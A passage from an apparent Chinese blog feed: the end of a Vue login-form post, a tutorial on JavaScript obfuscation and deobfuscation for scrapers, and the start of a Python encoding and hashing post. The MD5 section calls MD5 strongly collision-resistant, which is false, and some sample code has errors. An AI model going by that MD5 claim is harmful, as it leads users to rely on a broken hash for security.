<p>关于ElementUI的按需引入需要在babel.config.js文件里添加配置，包括message也要挂载到vue原型上，这些<a href="https://element.eleme.io/#/zh-CN/component/quickstart">ElementUI官方文档</a>都有的。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// babel.config.js</span>
module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  presets<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'@vue/cli-plugin-babel/preset'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"@babel/preset-env"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token string">"modules"</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  plugins<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">[</span>
      <span class="token string">"component"</span><span class="token punctuation">,</span>
      <span class="token punctuation">&#123;</span>
        <span class="token string">"libraryName"</span><span class="token operator">:</span> <span class="token string">"element-ui"</span><span class="token punctuation">,</span>
        <span class="token string">"styleLibraryName"</span><span class="token operator">:</span> <span class="token string">"theme-chalk"</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>向API提交表单，提交的数据格式要和后台接口统一，不然解析后数据可能为空。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// login.vue</span>
<span class="token comment">// 设置数据格式</span>
<span class="token keyword">const</span> headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"multipart/form-data"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">// 构造表单</span>
<span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
data<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ruleForm<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
data<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ruleForm<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 发请求</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$axios
<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"后台数据库地址"</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
headers<span class="token operator">:</span> headers<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
<span class="token comment">// console.log(res)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 提交完毕后重置表格，避免重复提交</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">[</span>formName<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">resetFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>剩下的就是完善一些细节，比如如何取消自动上报的一些信息以及用户操作完毕后的及时反馈。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// login.vue</span>
<span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$message</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        showClose<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        message<span class="token operator">:</span> <span class="token string">"注意：更改密码即可取消自动安全上报"</span><span class="token punctuation">,</span>
        type<span class="token operator">:</span> <span class="token string">"info"</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span></code></pre>
]]></content>
      <categories>
        <category>项目</category>
      </categories>
      <tags>
        <tag>Flask</tag>
        <tag>Vue</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>JS混淆与反混淆</title>
    <url>/javascript/JsCoder/</url>
    <content><![CDATA[<h1>js混淆的利与弊</h1>
<p><strong>站在网站开发者的角度</strong></p>
<p>1、是为了保护我们的前端代码逻辑<br>
2、精简代码、加快传输</p>
<p><strong>站在爬虫者的角度</strong></p>
<p>1、增加了获取数据的难度</p>
<h1>常见混淆与反混淆方法</h1>
<h2 id="JS压缩">JS压缩</h2>
<p>特征：</p>
<p><img src="https://s2.loli.net/2022/01/25/ATSCpEHNG3Rxzhq.png" alt=""></p>
<p>原理：<br>
削减是一个从源代码中删除不必要的字符的技术使它看起来简单而整洁。这种技术也 被称为代码压缩和最小化</p>
<h2 id="eval加密">eval加密</h2>
<p>js中的 eval() 方法就是一个 js 语言的执行器，它能把其中的参数按照 JavaScript 语法进行解析并执行，简单来说就是把原本的 js 代码变成了 eval 的参数，变成参数后代码就成了字符串，其中的一些字符就会被按照特定格式“编码”</p>
<p><strong>特征：</strong></p>
<p>最明显的特征是生成的代码以 eval(function(p,a,c,k,e,r)) 开头</p>
<p><img src="https://s2.loli.net/2022/01/25/xuv49CpL5Zm3XdM.png" alt=""></p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">200</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><strong>原理：</strong></p>
<p>这类混淆的关键思想在于将需要执行的代码进行一次编码，在执行的时候还原出浏览器可执行的合法 的脚本</p>
<p><strong>破解方法-浏览器</strong><br>
打开 谷歌 或者 火狐 浏览器<br>
按 F12 打开控制台<br>
把代码复制进去<br>
删除开头 eval 这4个字母<br>
按回车键</p>
<p><strong>破解方法-node.js</strong></p>
<p>将eval 的内容转变为普通的函数</p>
<h2 id="变量名混淆">变量名混淆</h2>
<p><img src="https://s2.loli.net/2022/01/25/MFHaX2eKUZLvtpE.png" alt=""></p>
<p><strong>原理：</strong></p>
<p><strong>字符串字面量混淆：</strong> 首先提取全部的字符串，在全局作用域创建一个字符串数组，同时转义字符增大 阅读难度，然后将字符串出现的地方替换成为数组元素的引用</p>
<pre class="language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">var _0x3012 &#x3D; [&#39;substring&#39;, &#39;atob&#39;, &#39;charCodeAt&#39;, &#39;push&#39;, &#39;test&#39;];
&#x2F;&#x2F; 打乱数组的内容
(function(_0x3ed35c, _0x48b8fe) &#123;
    var _0x1ad9d9 &#x3D; function(_0x8eeda7) &#123;
        while (--_0x8eeda7) &#123;
            _0x3ed35c[&#39;push&#39;](_0x3ed35c[&#39;shift&#39;]());
        &#125;
    &#125;;
    _0x1ad9d9(++_0x48b8fe);
&#125;(_0x3012, 0x153));
&#x2F;&#x2F; 用函数实现字符串的调用
var _0x3a8e &#x3D; function(_0xc40c11, _0x32bbb2) &#123;
    _0xc40c11 &#x3D; _0xc40c11 - 0x0;
    var _0x4e269a &#x3D; _0x3012[_0xc40c11];
    return _0x4e269a;
&#125;;

console.log(_0x3a8e(&#39;0x4&#39;));</code></pre>
<p>**变量名混淆：**不同于压缩器的缩短命名，此处使用了下划线加数字的格式，变量之间区分度很低，相 比单个字母更难以阅读</p>
<pre class="language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">&#x2F;*变量名混淆*&#x2F;
var _0x3a8e &#x3D; function(_0xc40c11, _0x32bbb2) &#123;
    _0xc40c11 &#x3D; _0xc40c11 - 0x0;
    var _0x4e269a &#x3D; _0x3012[_0xc40c11];
    return _0x4e269a;
&#125;;</code></pre>
<p>**成员运算符混淆：**将点运算符替换为字符串下标形式，然后对字符串进行混淆删除多余的空白字符：减小文件体积，这是所有压缩器都会做的事</p>
<pre class="language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">&#x2F;*成员运算符混淆*&#x2F;
console.log((&#39;&#39;)[&#39;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&#39;][&#39;\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65&#39;](65));

console.log((&#39;&#39;)[&#39;constructor&#39;][&#39;fromCharCode&#39;](65));


console.log(&#39;&#39;.constructor.fromCharCode(65))
console.log(&#39;&#39;.constructor)
console.log(String.fromCharCode(65));</code></pre>
<p>破解方法-IDE、解密工具、浏览器：特殊字符变成普通内容</p>
<p><strong>特征：</strong></p>
<p><img src="https://s2.loli.net/2022/01/25/QPW1Ve8H6wFBGZu.png" alt=""></p>
<ol>
<li>
<p>把变量名、函数名、参数名等，替换成没有语义，看着又很像的名字。</p>
<pre class="language-none"><code class="language-none">_0x21dd83、_0x21dd84、_0x21dd85</code></pre>
</li>
<li>
<p>用十六进制文本去表示一个字符串</p>
<pre class="language-none"><code class="language-none">\x56\x49\x12\x23</code></pre>
</li>
<li>
<p>利用JS能识别的编码来做混淆。JS是Unicode编码，本身就能识别这种编码。类似的一些变量名，函数名都可以用这个表示，并且调用。</p>
</li>
</ol>
<p>类似:</p>
<p><code>\u6210\u529f</code> 表示中文字符(成功)。</p>
<p>类似:</p>
<p><code>\u0053\u0074\u0072\u0069\u006e\u0067.\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065</code>  代表 String.fromCharCode</p>
<p>类似：</p>
<p><code>('')['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72']['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'];</code> 效果等同于String.fromCharCode</p>
<ol start="4">
<li>
<p>把一大堆方法名、字符串等存到数组中，这个数组可以是上千个成员。然后调用的时候，取数组成员去用</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Date"</span><span class="token punctuation">,</span><span class="token string">"getTime"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> time <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">window</span><span class="token punctuation">[</span>arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
</li>
<li>
<p>字符串加密后发送到前端，然后前端调用对应的函数去解密，得到明文</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'xxxx'</span><span class="token punctuation">]</span>

<span class="token comment">// 定义的解密函数</span>
<span class="token keyword">function</span> <span class="token function">dec</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token string">'push'</span>
<span class="token punctuation">&#125;</span>
test<span class="token punctuation">[</span><span class="token function">dec</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
</li>
</ol>
<h2 id="控制流平坦化">控制流平坦化</h2>
<p>将顺序执行的代码混淆成乱序执行,并加以混淆</p>
<p>以下两段代码的执行结果是相同的:</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 正常形态</span>
<span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">var</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>
    b <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    b <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    b <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    b <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> a <span class="token operator">+</span> b
<span class="token punctuation">&#125;</span>

<span class="token comment">// 乱序形态</span>
<span class="token comment">//（这里比较简单,在很多加密网站上case 后面往往不是数字或字符串,而是类似 YFp[15][45][4]这样的对象，相当恶心）</span>
<span class="token keyword">function</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>lenght<span class="token punctuation">,</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>
        b <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
        b <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
        <span class="token keyword">var</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
        b <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>
        <span class="token keyword">return</span> a <span class="token operator">+</span> b
      <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>
        b <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 结果都是30 但是test1看着费劲</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">test1</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>解决办法:  使用JavaScript的抽象语法书(AST) 进行还原</p>
<h2 id="压缩代码">压缩代码</h2>
<p>把多行代码压缩成一行</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>
  <span class="token keyword">var</span> c <span class="token operator">=</span> b <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> d <span class="token operator">=</span> b <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> e <span class="token operator">=</span> b <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> f <span class="token operator">=</span> b <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> e <span class="token operator">+</span> f
<span class="token punctuation">&#125;</span>

<span class="token comment">// 压缩一下</span>
<span class="token keyword">function</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>e<span class="token punctuation">,</span>f
  <span class="token keyword">return</span> f <span class="token operator">=</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>d <span class="token operator">=</span> <span class="token punctuation">(</span> c <span class="token operator">=</span> <span class="token punctuation">(</span>b <span class="token operator">=</span> a<span class="token punctuation">,</span>b <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>b <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>b <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>b <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>e <span class="token operator">+</span> f
<span class="token punctuation">&#125;</span></code></pre>
<p>解决办法:  使用JavaScript的抽象语法书(AST) 进行还原</p>
<h2 id="使用特定符号编写-js-脚本">使用特定符号编写 js 脚本</h2>
<p>特征：</p>
<p><img src="https://s2.loli.net/2022/01/25/JVOQbp4TcguLfhk.png" alt="image-20191225190724159"></p>
<p>原理：<br>
jsfuck 源于一门编程语言 brainfuck ，其主要的思想就是只使用8种特定的符号来编写代码。而 jsfuck<br>
也是沿用了这个思想，它仅仅使用6种符号来编写代码。它们分别是(、)、+、[、]、!。<br>
常用混淆工具：<br>
<a href="http://www.jsfuck.com/">http://www.jsfuck.com/</a><br>
破解方法： 无</p>
<h1>特殊转化规则</h1>
<p>利用一些只能在浏览器中运行的特殊语句进行反扒，这种只能讲语法重新进行改写</p>
<p>在浏览器中 base64 编码转换使用的是</p>
<p><code>_0x1c0cdf = _0xcbc80b['atob'](_0x1c0cdf)</code>,</p>
<p>但是在nodejs调试的时候使用的是</p>
<pre class="language-none"><code class="language-none">Buffer.from(_0x1c0cdf,&quot;base64&quot;).toString()</code></pre>
<p><a href="https://xyq.cbg.163.com/equip?s=40&amp;eid=202002011900113-40-NXOJDHZ8TKFX9&amp;o&amp;equip_refer=27&amp;view_loc=reco_sim%7C%7B%22tag%22%3A%20%22RL_sim2%22%7D">https://xyq.cbg.163.com/equip?s=40&amp;eid=202002011900113-40-NXOJDHZ8TKFX9&amp;o&amp;equip_refer=27&amp;view_loc=reco_sim|{&quot;tag&quot;%3A &quot;RL_sim2&quot;}</a></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>混淆</tag>
      </tags>
  </entry>
  <entry>
    <title>常见加密方式</title>
    <url>/python/Coder/</url>
    <content><![CDATA[<h3 id="前言">前言</h3>
<p>我们所说的加密方式，都是对二进制编码的格式进行加密的，对应到Python中，则是我们的<code>Bytes</code>。</p>
<p>所以当我们在Python中进行加密操作的时候，要确保我们操作的是<code>Bytes</code>，否则就会报错。</p>
<p>将字符串和<code>Bytes</code>互相转换可以使用<code>encode()</code>和<code>decode()</code>方法。如下所示：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 方法中不传参数则是以默认的utf-8编码进行转换</span>
a <span class="token operator">=</span> <span class="token string">"中国欢迎您"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>  <span class="token comment"># b'\xe4\xb8\xad\xe5\x9b\xbd\xe6\xac\xa2\xe8\xbf\x8e\xe6\x82\xa8'</span>

b <span class="token operator">=</span> a<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>  <span class="token comment"># 中国欢迎您</span></code></pre>
<p><strong>注：两位十六进制常常用来显示一个二进制字节。</strong></p>
<p>利用<code>binascii</code>模块可以将十六进制显示的字节转换成我们在加解密中更常用的显示方式：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii

<span class="token comment"># 方法中不传参数则是以默认的utf-8编码进行转换</span>
a <span class="token operator">=</span> <span class="token string">"中国欢迎您"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>  <span class="token comment"># b'\xe4\xb8\xad\xe5\x9b\xbd\xe6\xac\xa2\xe8\xbf\x8e\xe6\x82\xa8'</span>

b <span class="token operator">=</span> a<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>  <span class="token comment"># 中国欢迎您</span>

<span class="token comment"># 二进制到十二进制</span>
c <span class="token operator">=</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span><span class="token string">'中国欢迎您'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>  <span class="token comment"># c=== b'e4b8ade59bbde6aca2e8bf8ee682a8'</span>

<span class="token comment"># 十六进制到二进制</span>
d <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>  <span class="token comment"># b'\xe4\xb8\xad\xe5\x9b\xbd\xe6\xac\xa2\xe8\xbf\x8e\xe6\x82\xa8'</span>

v <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span>  <span class="token comment"># 中国欢迎您</span>

b <span class="token operator">=</span> a<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>  <span class="token comment"># 中国欢迎您</span>
</code></pre>
<h3 id="URL编码">URL编码</h3>
<p><strong>1、简介</strong></p>
<p>正常的URL中是只能包含ASCII字符的，也就是字符、数字和一些符号。而URL编码就是一种浏览器用来避免url中出现特殊字符（如汉字）的编码方式。其实就是将超出ASCII范围的字符转换成带<code>%</code>的十六进制格式。</p>
<p><strong>2、Python实现</strong></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse

<span class="token comment"># 编码</span>
a <span class="token operator">=</span> parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span><span class="token string">"中国欢迎您"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>  <span class="token comment"># %E4%B8%AD%E5%9B%BD%E6%AC%A2%E8%BF%8E%E6%82%A8</span>

<span class="token comment"># 解码</span>
b <span class="token operator">=</span> parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>  <span class="token comment"># 中国欢迎您</span></code></pre>
<h3 id="Base64编码">Base64编码</h3>
<p><strong>1、简介</strong></p>
<p>Base64是一种用64个字符来表示任意二进制数据的方法。</p>
<p>Base64编码可以成为密码学的基石。可以将任意的二进制数据进行Base64编码。所有的数据都能被编码为并只用65个字符就能表示的文本文件。（ 65字符：A~Z a~z 0~9 + / = ）编码后的数据~=编码前数据的4/3，会大1/3左右。</p>
<p><strong>2、Base64编码的原理</strong></p>
<p><img src="https://s2.loli.net/2022/01/25/cPkQK3IM97vtbsj.jpg" alt="aryxq-axx4s"></p>
<ol>
<li>将所有字符转化为ASCII码。</li>
<li>将ASCII码转化为8位二进制 。</li>
<li>将二进制3个归成一组(不足3个在后边补0)共24位，再拆分成4组，每组6位。</li>
<li>统一在6位二进制前补两个0凑足8位。</li>
<li>将补0后的二进制转为十进制。</li>
<li>从Base64编码表获取十进制对应的Base64编码。</li>
</ol>
<p><strong>3、Base64编码的说明</strong></p>
<ol>
<li>转换的时候，将三个byte的数据，先后放入一个24bit的缓冲区中，先来的byte占高位。</li>
<li>数据不足3byte的话，于缓冲区中剩下的bit用0补足。然后，每次取出6个bit，按照其值选择查表选择对应的字符作为编码后的输出。</li>
<li>不断进行，直到全部输入数据转换完成。</li>
<li>如果最后剩下两个输入数据，在编码结果后加1个“=”。</li>
<li>如果最后剩下一个输入数据，编码结果后加2个“=”。</li>
<li>如果没有剩下任何数据，就什么都不要加，这样才可以保证资料还原的正确性。</li>
</ol>
<p><strong>4、Python的Base64使用</strong></p>
<p>Python内置的<code>base64</code>模块可以直接进行base64的编解码</p>
<p><strong>注意：用于base64编码的，要么是ASCII包含的字符，要么是二进制数据</strong></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64

<span class="token comment"># 编码</span>
a <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">b"hello world"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>  <span class="token comment"># b'aGVsbG8gd29ybGQ='</span>

<span class="token comment"># 解码</span>
b <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>  <span class="token comment"># b"hello world"</span></code></pre>
<p><strong>5、Base64格式的文件</strong></p>
<p>在前端中，有很多文件也被编辑成base的文件，使用这种格式也可以进行还原</p>
<h3 id="MD5（信息-摘要算法）">MD5（信息-摘要算法）</h3>
<p><strong>1、简述</strong></p>
<p>message-digest algorithm 5（信息-摘要算法）。经常说的“MD5加密”，就是它→信息-摘要算法。</p>
<p>md5，其实就是一种算法。可以将一个字符串，或文件，或压缩包，执行md5后，就可以生成一个固定长度为128bit 的串。这个串，基本上是唯一的。</p>
<p><strong>2、不可逆性</strong></p>
<p>每个人都有不同的指纹，看到这个人，可以得出他的指纹等信息，并且唯一对应，但你只看一个指纹，是不可能看到或读到这个人的长相或身份等信息。</p>
<p><strong>3、特点</strong></p>
<ol>
<li>压缩性：任意长度的数据，算出的MD5值长度都是固定的。</li>
<li>容易计算：从原数据计算出MD5值很容易。</li>
<li>抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。</li>
<li>强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。</li>
</ol>
<p>举个栗子：我从树下捡了一片叶子，全世界有数不清的树叶，我就想整个世界会不会有一片完全一样的叶子? 以一片有限的叶子对世界上无限的树叶，这个理论上的确是可以找到一片完全的叶子，可是实际情况下很难很难找到。</p>
<p><strong>4、Python的MD5使用</strong></p>
<p>由于MD5模块在python3中被移除，在python3中使用<code>hashlib</code>模块进行md5操作</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib

<span class="token comment"># 待加密信息</span>
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'中国你好'</span>

<span class="token comment"># 创建md5对象，</span>
<span class="token comment"># md5对象，md5不能反解，但是加密是固定的，就是关系是一一对应，所以有缺陷，可以被对撞出来</span>
hl <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 要对哪个字符串进行加密，就放这里</span>
<span class="token comment"># 此处必须声明encode</span>
<span class="token comment"># 若写法为hl.update(str)  报错为： Unicode-objects must be encoded before hashing</span>
